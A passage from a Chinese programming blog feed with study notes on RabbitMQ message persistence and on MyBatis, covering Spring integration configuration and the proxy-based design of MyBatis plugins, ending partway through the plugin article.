<h4 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h4><p>每个RabbitMQ服务器都能创建虚拟消息服务器，称为虚拟主机（vhost），每个RabbitMQ本质上是一个mini版的RabbitMQ服务器，拥有自己的队列、交换器、绑定，还有自己的权限机制。</p>
<p>连接时，必须制定vhost，rabbitmq包含了默认的vhost：”/“。当创建一个用户时，会被指派给至少一个vhsot，并且相互隔离。</p>
<p>vhost不能通过AMQP协议创建，需要使用rabbitmqctl工具创建。</p>
<h4 id="消息持久化和发送方确认模式"><a href="#消息持久化和发送方确认模式" class="headerlink" title="消息持久化和发送方确认模式"></a>消息持久化和发送方确认模式</h4><p>如果没有持久化，重启rabbitmq后，队列、交换器都会消失，RabbitMQ提供了持久化的功能，需要满足以下三个条件：</p>
<ul>
<li>交换器设置为持久化，通过durable属性；</li>
<li>队列设置为持久化，通过durable属性；</li>
<li>消息投递模式delivery设置为2；</li>
</ul>
<p>当发布一条持久化消息到持久化交换器上时，rabbit会在消息提交到日志文件后才会发送响应，所有会损失性能，所以，只对重要数据持久化即可。</p>
<p>考虑这种情况：由于发布消息后，不返回任何信息给生产者，如何只对服务器已经持久化到硬盘了呢，可能在传输过程中丢失，或者持久化前服务器宕机，导致消息丢失。</p>
<p>RabbitMQ通过「发送方确认模式」来解决上面的问题。首先，需要将信道设置成confirm模式，这样所有在信道上发布的消息都会被指派一个唯一的ID号，一旦消息被投递到所有匹配的队列或持久化到磁盘，会发送一个确认消息给生产者。</p>
<p>通过本篇的介绍，对Rabbit的消息模型有了整体了解，下一篇会写个DEMO，并介绍下运行和管理RabbitMQ。</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 消息队列 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RabbitMQ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入浅出MyBatis：MyBatis与Spring集成及实用场景]]></title>
      <url>https://qqdong.github.io/2018/03/31/MyBatis%E4%B8%8ESpring%E9%9B%86%E6%88%90%E5%8F%8A%E5%AE%9E%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
      <content type="html"><![CDATA[<blockquote>
<p>本系列是「深入浅出MyBatis：技术原理与实践」书籍的总结笔记。</p>
</blockquote>
<p>本篇是「深入浅出MyBatis」系列的最后一篇，主要介绍与Spring的集成，以及工作中的一些实用场景。</p>
<p>介绍之前，先整体总结下该系列的内容和写作思路。</p>
<p>MyBatis是一个框架，封装了数据库相关的操作，给我们开发人员带来了极大地便利，相对于Hibernate，有很大的灵活性和扩展性，在高并发高性能应用中，这点很重要。</p>
<p>首先介绍了JDBC的规范，了解我们最原始最熟悉的操作数据库的方式，MyBatis就是在此基础上进行封装和抽象。</p>
<p>然后，介绍了MyBatis的特性和核心组件，对其有个整体了解。</p>
<p>之后，详解介绍了MyBatis的配置、映射器，它们是平时使用、接触最多的，可以很好的使用MyBatis进行开发了。</p>
<p>最后，回顾了反射和动态代理基础，深入分析了MyBatis的解析和运行原理，插件及开发过程，一方面对MyBatis的核心组件有更深入的了解，一方面可以更好进行插件的开发，对sql进行统一处理。</p>
<p>实际使用中，往往会和Spring集成一起使用，可以减少我们的工作量，通过本篇的介绍，你会了解到：</p>
<ul>
<li>Spring的基础知识：IOC、AOP、事务管理；</li>
<li>MyBatis-Spring应用：配置和集成</li>
<li>实用场景介绍</li>
</ul>
<a id="more"></a>
<h4 id="Spring-IOC和AOP"><a href="#Spring-IOC和AOP" class="headerlink" title="Spring IOC和AOP"></a>Spring IOC和AOP</h4><p>了解Spring的基础，有助于理解集成配置，Spring技术主要由IOC和AOP两个基础功能构成。</p>
<h5 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h5><p>IOC称为控制反转，可以这样理解：以前我们获取一个类的对象，都是去new一个，必须确定实现类是哪个，有了IOC，所有配置为Spring管理的对象都由Spring管理，包括对象的创建和生命周期，这样，去获取类的对象时，不需要显示指定，由Spring去决定返回哪个对象。</p>
<p>这样，对象的创建，控制权由业务代码转向给了Spring，称为控制反转。</p>
<h5 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h5><p>AOP称为面向切面编程，所谓切面，是说在正常逻辑中插入一些逻辑处理代码，比如插入日志记录、事务管理等代码，其中，日志记录和事务管理就是切面。Spring AOP可以在不修改原有方法逻辑的情况下，通过简单配置，对受影响的类方法统一插入切面处理代码。</p>
<p>Spring AOP是通过动态代理实现的，当Spring的服务包含接口描述时，采用JDK动态代理，否则采用CGLIB代理。</p>
<p>最后，简单说明下AOP相关的概念，便于理解它的配置：</p>
<ul>
<li>切入点：Spring生成代理对象后，当调用服务方法时，会调用InvitationHandler的invoke方法，需要拦截哪些方法，进行特殊处理呢，这就是切入点，Spring可以通过正则进行配置；</li>
<li>切面：上面已经介绍了，日志记录、事务管理等需要处理的逻辑对象，就是切面；</li>
<li>连接点：它是在程序运行中根据不同的通知来实现的程序段，通知包括，前置通知、后置通知、异常后通知、正常返回后通知、环绕通知；</li>
</ul>
<h4 id="Spring-事务管理"><a href="#Spring-事务管理" class="headerlink" title="Spring 事务管理"></a>Spring 事务管理</h4><p>在编写业务代码时，一个业务方法可能涉及多张表或多条sql语句，同一条表数据可能会被同时访问，数据库的事务控制很重要，通过Spring AOP和Spring 事务管理，可以大量减少我们的代码，对各种场景的事务管理也很方便。</p>
<h5 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h5><ul>
<li>读未提交：可能出现脏读问题，一个事务读取另一个事务未提交的数据；</li>
<li>读已提交：可能出现不可重复读问题，针对同一条记录，同一个事务前后可能读取不同的数据；</li>
<li>可重复读：可能出现幻读问题，针对删除和插入记录，同一个查询条件，同一个事务返回的记录数可能不同；</li>
<li>序列化：所有操作会按顺序执行；</li>
</ul>
<p>MySql默认隔离级别为可重复读。</p>
<h5 id="传播行为"><a href="#传播行为" class="headerlink" title="传播行为"></a>传播行为</h5><p>传播行为，是指方法之间的调用，事务如何传递，在Spring中定义了7种传播行为，可根据不同场景进行配置，不一一介绍了，举几个说明下：</p>
<ul>
<li>PROPAGATION_REQUIRED：如果存在一个事务，则使用当前事务，否则开启一个事务；</li>
<li>PROPAGATION_SUPPORTS：如果存在一个事务，则支持当前事务，否则以非事务执行；</li>
<li>PROPAGATION_REQUIRES_NEW：总是开启一个新的事务，即使有一个事务存在；</li>
<li>PROPAGATION_NOT_SUPPORTED：总是以非事务执行，挂起已存在的事物；</li>
</ul>
<p>Spring默认的传播行为为PROPAGATION_REQUIRED。</p>
<h4 id="MyBatis-Spring集成配置"><a href="#MyBatis-Spring集成配置" class="headerlink" title="MyBatis-Spring集成配置"></a>MyBatis-Spring集成配置</h4><p>了解了Spring的IOC，进行集成配置就比较简单了，另外，除了业务SQL的编写，事务是很重要的一部分，Spring AOP和事务管理帮我们解决了。</p>
<p>MyBatis提供了和Spring无缝对接的功能，主要通过mybatis-spring-x.x.x.jar实现，下面说下集成配置的过程：</p>
<h5 id="配置数据源"><a href="#配置数据源" class="headerlink" title="配置数据源"></a>配置数据源</h5><p>使用c3p0的实现，只要实现javax.sql.DataSource接口都可以。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">"dataSource"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span><br><span class="line">		&lt;property name="driverClass" value="$&#123;c3p0.driverClass&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="jdbcUrl" value="$&#123;c3p0.jdbcUrl&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="user" value="$&#123;c3p0.user&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="password" value="$&#123;c3p0.password&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="acquireIncrement" value="$&#123;c3p0.acquireIncrement&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="initialPoolSize" value="$&#123;c3p0.initialPoolSize&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="maxIdleTime" value="$&#123;c3p0.maxIdleTime&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="maxPoolSize" value="$&#123;c3p0.maxPoolSize&#125;"&gt;&lt;/property&gt;</span><br><span class="line">		&lt;property name="minPoolSize" value="$&#123;c3p0.minPoolSize&#125;"&gt;&lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<h5 id="配置SqlSessionFactory"><a href="#配置SqlSessionFactory" class="headerlink" title="配置SqlSessionFactory"></a>配置SqlSessionFactory</h5><p>它是生成SqlSession的，组件提供了org.mybatis.spring.SqlSessionFactoryBean类给我们去配置。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">"sqlSessionFactory"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span><br><span class="line">		&lt;property name=<span class="string">"dataSource"</span> ref=<span class="string">"dataSource"</span> /&gt;</span><br><span class="line">		&lt;!-- 自动扫描entity目录以匹配别名 --&gt;</span><br><span class="line">		&lt;property name=<span class="string">"typeAliasesPackage"</span> value=<span class="string">"com.xiaomi.kfs.mcc.persistence, com.xiaomi.kfs.authority.core"</span> /&gt;</span><br><span class="line">		&lt;!-- 显式指定Mapper文件位置 --&gt;</span><br><span class="line">		&lt;property name=<span class="string">"mapperLocations"</span> value=<span class="string">"classpath*:context/mybatis/*Mapper.xml"</span> /&gt;</span><br><span class="line">		&lt;!-- 指定mybatis配置文件 --&gt;</span><br><span class="line">		&lt;property name="configLocation" value="classpath:mybatis-config.xml"&gt;&lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>配置文件mybatis-config.xml前面文章介绍了，就不再次写了。</p>
<h5 id="配置自动扫描mapper-bean："><a href="#配置自动扫描mapper-bean：" class="headerlink" title="配置自动扫描mapper bean："></a>配置自动扫描mapper bean：</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span>&gt;</span><br><span class="line">		&lt;property name=<span class="string">"basePackage"</span> value=<span class="string">"com.xiaomi.kfs.mcc.persistence,com.xiaomi.kfs.mcc.workorder, com.xiaomi.kfs.authority.core"</span> /&gt;</span><br><span class="line">		&lt;property name=<span class="string">"annotationClass"</span> value=<span class="string">"com.xiaomi.common.annotation.MyBatisRepository"</span> /&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<h5 id="配置事务"><a href="#配置事务" class="headerlink" title="配置事务"></a>配置事务</h5><p>使用Spring AOP管理事务。</p>
<!--配置事务管理器-->
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">"transactionManager"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span><br><span class="line">    &lt;property name=<span class="string">"dataSource"</span> ref=<span class="string">"dataSource"</span> /&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 使用annotation定义事务 <span class="meta">@Transactional</span> --&gt;</span><br><span class="line">&lt;tx:annotation-driven transaction-manager=<span class="string">"transactionManager"</span> /&gt;</span><br></pre></td></tr></table></figure>
<h4 id="使用场景介绍"><a href="#使用场景介绍" class="headerlink" title="使用场景介绍"></a>使用场景介绍</h4><p>实际工作中，可能有很多使用场景，下面会简单介绍些这些场景，说明实现思路。</p>
<h5 id="数据库BLOB字段读写"><a href="#数据库BLOB字段读写" class="headerlink" title="数据库BLOB字段读写"></a>数据库BLOB字段读写</h5><p>对于文件，在数据库中，一般通过BLOB字段存储，MyBatis提供了BlobTypeHandler进行类型映射，可以把byte[]类型和BLOB类型自动转换。</p>
<p>但更多的时候，我们会把文件专门存放在一个文件服务器中，数据库存储文件路径即可。</p>
<h5 id="批量更新"><a href="#批量更新" class="headerlink" title="批量更新"></a>批量更新</h5><p>批量更新有助于提高数据库性能，可以修改defaultExecutorType，设置为BATCH，这样一个事务如果有多条sql，只有在commit后才会发送SQL到数据库。</p>
<p>但要注意，如果程序上下文中，依赖插入的数据主键，可以通过调用sqlSession的flushStatements方法主动将当前缓存的sql发送给数据库执行。</p>
<h5 id="调用存储过程"><a href="#调用存储过程" class="headerlink" title="调用存储过程"></a>调用存储过程</h5><p>MyBatis支持存储过程，对其进行了封装，具体配置过程在此不做详细介绍了。</p>
<h5 id="分表"><a href="#分表" class="headerlink" title="分表"></a>分表</h5><p>如果系统数据库比较大，可通过分表减少单表的压力，MyBatis允许把表名作为参数传递到SQL中，很容易实现。</p>
<h5 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h5><p>MyBatis具有分页功能，通过RowBounds实现，但它有个问题，会在一条SQL中查询所有的结果，再根据从第几条到第几条取数据返回。可以通过编写一个插件，重写SQL进行分页，进行统一处理。</p>
<h5 id="使用枚举类型"><a href="#使用枚举类型" class="headerlink" title="使用枚举类型"></a>使用枚举类型</h5><p>之前文章介绍过，通过自定义typeHandler可以很容易的实现。</p>
<p>后续开始阅读「RabbitMQ实战：高效部署分布式消息队列」，并进行总结和分享。</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> MyBatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入浅出MyBatis：MyBatis插件及开发过程]]></title>
      <url>https://qqdong.github.io/2018/03/30/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9AMyBatis%E6%8F%92%E4%BB%B6%E5%8F%8A%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B/</url>
      <content type="html"><![CDATA[<blockquote>
<p>本篇文章是「深入浅出MyBatis：技术原理与实践」书籍的总结笔记。</p>
</blockquote>
<p>上一篇介绍了 <a href="http://qqidol.com/2018/03/29/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9AMyBatis%E8%A7%A3%E6%9E%90%E5%92%8C%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">MyBatis解析和运行原理</a> ，包括SqlSessionFactory的构建和SqlSession的执行过程，其中，SqlSession包含四大对象，可以在四大对象调度的时候插入自定义的代码，以满足特殊的需求，这便是MyBatis提供的插件技术。</p>
<p>有些特殊场景，需要使用插件统一处理，比如：在进行多租户开发时，数据要按租户隔离，可以在sql语句后面统一添加租户编号筛选条件。</p>
<p>本篇就来介绍下插件，通过本篇的介绍，你会了解到：</p>
<ul>
<li>插件接口和初始化</li>
<li>插件的代理和反射设计</li>
<li>工具类MetaObject介绍</li>
<li>插件的开发过程</li>
</ul>
<a id="more"></a>
<h4 id="插件的接口和初始化分析"><a href="#插件的接口和初始化分析" class="headerlink" title="插件的接口和初始化分析"></a>插件的接口和初始化分析</h4><h5 id="插件接口"><a href="#插件接口" class="headerlink" title="插件接口"></a>插件接口</h5><p>在MyBatis中使用插件，需要实现Interceptor接口，定义如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Interceptor</span> </span>&#123;</span><br><span class="line">  <span class="function">Object <span class="title">intercept</span><span class="params">(Invocation invocation)</span> <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function">Object <span class="title">plugin</span><span class="params">(Object target)</span></span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">setProperties</span><span class="params">(Properties properties)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>详细说说这3个方法：</p>
<ul>
<li>intercept：它将直接覆盖你所拦截的对象，有个参数Invocation对象，通过该对象，可以反射调度原来对象的方法；</li>
<li>plugin：target是被拦截的对象，它的作用是给被拦截对象生成一个代理对象；</li>
<li>setProperties：允许在plugin元素中配置所需参数，该方法在插件初始化的时候会被调用一次；</li>
</ul>
<h5 id="插件初始化"><a href="#插件初始化" class="headerlink" title="插件初始化"></a>插件初始化</h5><p>插件的初始化时在MyBatis初始化的时候完成的，读入插件节点和配置的参数，使用反射技术生成插件实例，然后调用插件方法中的setProperties方法设置参数，并将插件实例保存到配置对象中，具体过程看下面代码。</p>
<p>plugin配置示例如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">"com.qqdong.study.mybatis.TenantPlugin"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dbType"</span> <span class="attr">value</span>=<span class="string">"mysql"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>插件初始化过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMLConfigBuilder</span> <span class="keyword">extends</span> <span class="title">BaseBuilder</span> </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">pluginElement</span><span class="params">(XNode parent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (XNode child : parent.getChildren()) &#123;</span><br><span class="line">        String interceptor = child.getStringAttribute(<span class="string">"interceptor"</span>);</span><br><span class="line">        Properties properties = child.getChildrenAsProperties();</span><br><span class="line">        Interceptor interceptorInstance = (Interceptor) resolveClass(interceptor).newInstance();</span><br><span class="line">        interceptorInstance.setProperties(properties);</span><br><span class="line">    </span><br><span class="line">     configuration.addInterceptor(interceptorInstance);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置对象Configuration的添加插件方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Configuration</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">final</span> InterceptorChain interceptorChain = <span class="keyword">new</span> InterceptorChain();</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptor</span><span class="params">(Interceptor interceptor)</span> </span>&#123;</span><br><span class="line">    interceptorChain.addInterceptor(interceptor);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>InterceptorChain是一个类，主要包含一个List属性，保存Interceptor对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorChain</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Interceptor&gt; interceptors = <span class="keyword">new</span> ArrayList&lt;Interceptor&gt;();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">pluginAll</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Interceptor interceptor : interceptors) &#123;</span><br><span class="line">      target = interceptor.plugin(target);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptor</span><span class="params">(Interceptor interceptor)</span> </span>&#123;</span><br><span class="line">    interceptors.add(interceptor);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;Interceptor&gt; <span class="title">getInterceptors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Collections.unmodifiableList(interceptors);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="插件的代理和反射设计原理"><a href="#插件的代理和反射设计原理" class="headerlink" title="插件的代理和反射设计原理"></a>插件的代理和反射设计原理</h4><h5 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h5><p>插件用的是责任链模式，责任链模式是一种对象行为模式。在责任链模式里，很多对象由每一个对象对其下家的引用而连接起来形成一条链，请求在这个链上传递，直到链上的某一个对象决定处理此请求。</p>
<h5 id="设计细节"><a href="#设计细节" class="headerlink" title="设计细节"></a>设计细节</h5><p>前面提到了InterceptorChain类，其中有个pluginAll方法，责任链就是在该方法定义的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">pluginAll</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Interceptor interceptor : interceptors) &#123;</span><br><span class="line">      target = interceptor.plugin(target);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面介绍过plugin方法，它是生成代理对象的方法，从第一个对象(四大对象中的一个)开始，将对象传递给了plugin方法，返回一个代理；如果存在第二个插件，就拿着第一个代理对象，传递给plugin方法，返回第一个代理对象的代理…..</p>
<p>plugin方法是需要我们去实现的，如何生成代理类呢，MyBatis提供了Plugin工具类，它实现了InvocationHandler接口（JDK动态代理的接口），看看它的2个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Plugin</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">wrap</span><span class="params">(Object target, Interceptor interceptor)</span> </span>&#123;</span><br><span class="line">    Map&lt;Class&lt;?&gt;, Set&lt;Method&gt;&gt; signatureMap = getSignatureMap(interceptor);</span><br><span class="line">    Class&lt;?&gt; type = target.getClass();</span><br><span class="line">    Class&lt;?&gt;[] interfaces = getAllInterfaces(type, signatureMap);</span><br><span class="line">    <span class="keyword">if</span> (interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">          type.getClassLoader(),</span><br><span class="line">          interfaces,</span><br><span class="line">          <span class="keyword">new</span> Plugin(target, interceptor, signatureMap));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Set&lt;Method&gt; methods = signatureMap.get(method.getDeclaringClass());</span><br><span class="line">      <span class="keyword">if</span> (methods != <span class="keyword">null</span> &amp;&amp; methods.contains(method)) &#123;</span><br><span class="line">        <span class="keyword">return</span> interceptor.intercept(<span class="keyword">new</span> Invocation(target, method, args));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> ExceptionUtil.unwrapThrowable(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析下这块代码，Plugin提供了静态方法wrap方法，它会根据插件的签名配置，使用JDK动态代理的方法，生成一个代理类，当四大对象执行方法时，会调用Plugin的invoke方法，如果方法包含在声明的签名里，就会调用自定义插件的intercept方法，传入Invocation对象。</p>
<p>另外，Invocation对象包含一个proceed方法，这个方法就是调用被代理对象的真实方法，如果有n个插件，第一个传递的参数是四大对象本身，然后调用一次wrap方法产生第一个代理对象，这里的反射就是四大对象的真实方法，如果有第二个插件，这里的反射就是第一个代理对象的invoke方法。</p>
<p>所以，在多个插件的情况下，调度proceed方法，MyBatis总是从最后一个代理对象运行到第一个代理对象，最后是真实被拦截的对象方法被执行。</p>
<h4 id="工具类MetaObject介绍"><a href="#工具类MetaObject介绍" class="headerlink" title="工具类MetaObject介绍"></a>工具类MetaObject介绍</h4><p>MetaObject是MyBatis给我们提供的工具类，它可以有效的获取或修改一些重要对象的属性。</p>
<p>举例说明，我们拦截StatementHandler对象，首先要获取它要执行的SQL，添加返回行数限制。</p>
<p>编写一个自定义插件，实现intercept方法，方法实现如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">StatementHandler statementHandler=(StatementHandler)invocation.getTarget();</span><br><span class="line">MetaObject metaObj=SystemMetaObject.forObject(statementHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取sql</span></span><br><span class="line">String sql=(String)metaStatementHandler.getValue(<span class="string">"delegate.bound.sql"</span>);</span><br><span class="line"><span class="comment">//添加limit条件</span></span><br><span class="line">sql=<span class="string">"select * from ("</span> + sql + <span class="string">") limit 1000"</span>;</span><br><span class="line"><span class="comment">//重新设置sql</span></span><br><span class="line">metaStatementHandler.setValue(<span class="string">"delegate.bound.sql"</span>,sql);</span><br></pre></td></tr></table></figure>
<h4 id="插件的开发过程"><a href="#插件的开发过程" class="headerlink" title="插件的开发过程"></a>插件的开发过程</h4><p>最后总结下插件的开发步骤。</p>
